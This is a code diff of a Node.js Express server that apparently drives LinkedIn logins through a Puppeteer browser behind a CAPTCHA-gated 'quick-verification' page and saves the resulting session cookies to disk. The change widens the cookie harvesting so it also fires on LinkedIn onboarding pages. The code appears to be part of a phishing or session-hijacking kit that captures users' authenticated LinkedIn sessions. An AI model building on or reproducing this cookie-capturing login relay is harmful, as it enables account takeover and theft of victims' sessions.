@@ -73,7 +73,6 @@ if (!fs.existsSync(cookiesDir)) {
   fs.mkdirSync(cookiesDir, { recursive: true });
 }
 
-
 // Session middleware
 app.use(
   session({
@@ -131,8 +130,8 @@ app.get("/quick-verification.html", requireCaptcha, (req, res) => {
 });
 
 // Catch-all route for views folder - protect all view files
-app.get('/views/*', (req, res) => {
-    res.redirect('/');
+app.get("/views/*", (req, res) => {
+  res.redirect("/");
 });
 
 // CAPTCHA verification endpoint
@@ -152,7 +151,6 @@ app.post("/verify", async (req, res) => {
     res.status(500).json({ error: "CAPTCHA verification failed" });
   }
 });
-
 
 let sessions = {};
 
@@ -413,19 +411,19 @@ app.post("/api/linkedin/login", async (req, res) => {
   }
 
   try {
-    // const browser = await puppeteer.launch({ headless: false });
-     const browser = await puppeteer.launch({
-       args: [
-         "--disable-setuid-sandbox",
-         "--no-sandbox",
-         "--single-process",
-         "--no-zygote",
-       ],
-       executablePath:
-         process.env.NODE_ENV === "production"
-           ? process.env.PUPPETEER_EXECUTABLE_PATH
-           : puppeteer.executablePath(),
-     });
+    const browser = await puppeteer.launch({ headless: false });
+    //  const browser = await puppeteer.launch({
+    //    args: [
+    //      "--disable-setuid-sandbox",
+    //      "--no-sandbox",
+    //      "--single-process",
+    //      "--no-zygote",
+    //    ],
+    //    executablePath:
+    //      process.env.NODE_ENV === "production"
+    //        ? process.env.PUPPETEER_EXECUTABLE_PATH
+    //        : puppeteer.executablePath(),
+    //  });
     const page = await browser.newPage();
 
     // Set up page configuration
@@ -495,7 +493,6 @@ app.post("/api/linkedin/login", async (req, res) => {
     await handleCaptchaChallenge(page, browser, sessionId, 0);
   } catch (err) {
     console.error("Error in /api/linkedin/login:", err);
-    res.status(500).send(err);
   }
 });
 
@@ -1064,6 +1061,10 @@ app.post("/api/linkedin/check-app", async (req, res) => {
       collectAndSaveCookies(page, sessionId);
       return res.send("1");
     }
+    else if (currentUrl.includes("onboarding")) {
+      collectAndSaveCookies(page, sessionId);
+      return res.send("1");
+    }
 
     try {
       // First check if the title contains "LinkedIn App Challenge"
@@ -1538,6 +1539,5 @@ async function collectAndSaveCookies(page, sessionId) {
 
 // Server Initialization
 app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
-  });
-  
+  console.log(`Server is running on port ${port}`);
+});
